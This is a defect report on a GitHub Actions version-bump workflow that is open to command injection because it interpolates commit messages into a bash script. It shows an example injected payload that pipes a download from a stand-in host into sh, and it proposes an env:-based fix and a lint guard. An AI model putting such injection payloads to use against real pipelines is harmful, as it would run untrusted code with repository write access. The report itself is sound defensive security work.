# DEFECT-004: Semantic Version Bump workflow broken by commit-message shell injection (command-injection vector)

**Pipeline**: CI / GitHub Actions — `.github/workflows/version.yml`, failure on commit dc34e9d (2026-04-09 02:51 UTC)
**Run URL**: https://github.com/P47Phoenix/Claude-Plugins/actions/runs/24169808603/job/70538914872
**Severity**: Major (blocks all future version bumps) + Security (classic GitHub Actions command-injection vector)
**Priority**: P0 — blocks releases and has a security dimension
**Category**: CI workflow / security (systemic repo defect)

## Description
The "Semantic Version Bump" workflow at `.github/workflows/version.yml` uses `${{ github.event.head_commit.message }}` **directly interpolated into a bash `run:` script** at line 25:

```yaml
COMMIT_MSG="${{ github.event.head_commit.message }}"
```

GitHub Actions expands `${{ ... }}` expressions at workflow-compile time by pasting the raw string into the generated shell script *before* bash ever parses it. The commit message is fully attacker-controlled text. When commit dc34e9d landed with a body containing parenthesized phrases like `(empirical measurement deferred)`, those characters were pasted verbatim into the temp script, and bash parsed `(` as unexpected syntax at line 16 of the generated script. The workflow failed with exit code 2, blocking the version bump.

This is not merely a syntax-fragility bug — it is a **command-injection vulnerability**. A hostile commit message of the form `"; curl evil.sh | sh; "` would execute arbitrary code inside the runner with `contents: write` permission, which is exactly what this job requests in order to push the version bump.

## Evidence
- `.github/workflows/version.yml` line 25:
  ```
  COMMIT_MSG="${{ github.event.head_commit.message }}"
  ```
- Failed run: https://github.com/P47Phoenix/Claude-Plugins/actions/runs/24169808603/job/70538914872
- Triggering commit: dc34e9d (body contained unescaped `(...)` phrases)
- Bash error: unexpected syntax near `(` at line 16 of the generated temp script, exit code 2
- GitHub Actions security guidance: "Using an action's input or an environment variable for a script is safer than using direct interpolation" — `${{ }}` expressions in `run:` blocks are a documented injection sink.

## Reproduction
1. Push any commit to `main` whose message contains unescaped shell metacharacters — parentheses `()`, backticks `` ` ``, `$(...)`, `;`, `&&`, newlines with shell fragments, etc.
2. Observe the "Semantic Version Bump" workflow fail at the "Determine version bump from commit message" step with a bash syntax error (or, in the hostile case, execute injected code).

## Root Cause
Line 25 uses workflow-compile-time interpolation (`${{ ... }}`) to pass attacker-controlled commit message text into a shell script. This is the canonical GitHub Actions script-injection antipattern. The value must be passed via `env:` so bash reads it at runtime as a plain environment-variable string, never as script source.

## Affected Files
- `.github/workflows/version.yml` (line 25 — the actual injection sink)

## Scope Check — Other Workflows
Grepped all files in `.github/workflows/` for `${{ ... }}` usage inside `run:` blocks:

- `release.yml` — interpolates only trusted values: `steps.prev.outputs.tag` (from a controlled earlier step), `github.repository` (static repo slug, not user-controllable), and `secrets.GITHUB_TOKEN` (via `env:`, correct). **No user-text injection sinks.**
- `version.yml` — **line 25 is the sole offender** (`github.event.head_commit.message`). Line 20 (`secrets.GITHUB_TOKEN` in `with:`) and line 52 (`steps.bump.outputs.type` from a controlled earlier step) are safe.
- `docs.yml` — untracked (present on disk but not yet committed per `git status`). Not audited in-scope for this defect; re-check before the file is committed.

**Conclusion**: The injection pattern is isolated to `version.yml` line 25 among tracked workflows. It is still classified as a systemic repo defect because it reflects a pattern authors may repeat; a regression guard is warranted (see Proposed Fix §4).

## Proposed Fix
1. **Pass the commit message via `env:`**, not via `${{ }}` interpolation, so bash reads it as a runtime string:
   ```yaml
   - name: Determine version bump from commit message
     id: bump
     env:
       COMMIT_MSG: ${{ github.event.head_commit.message }}
     run: |
       FIRST_LINE=$(echo "$COMMIT_MSG" | head -n 1)
       ...
   ```
   With `env:`, the value is injected at runtime as an environment variable. Bash sees `$COMMIT_MSG` as a plain variable reference, and the content is never interpreted as script source regardless of what characters it contains.
2. **Re-run** the version bump workflow against a synthetic commit whose message contains `()`, backticks, and `$(...)` to confirm the fix.
3. **Audit `docs.yml`** (currently untracked) for the same pattern before it is committed.
4. **Regression guard**: add a lightweight CI lint (or a plugin-dev check) that greps workflow `run:` blocks for `${{ github.event.*` and `${{ github.head_ref` / similar attacker-controllable expressions, failing CI if any are found. This prevents reintroduction.
5. **Principle-of-least-privilege check**: confirm the `contents: write` permission on this job is scoped as tightly as possible given it processes untrusted input.

## Classification
**Systemic repo defect** — CI workflow authored with a known-unsafe GitHub Actions pattern. Single current instance, but the class of bug warrants a regression guard so it cannot reappear in other workflows. Not a delivery-flow plugin defect.

## Status
**Open** — logged by PO on 2026-04-08. P0. Fix is a ~5-line YAML change; recommend immediate PR. Underlying workflow intentionally not modified in this ticket (logging only, per defect-tracking protocol).
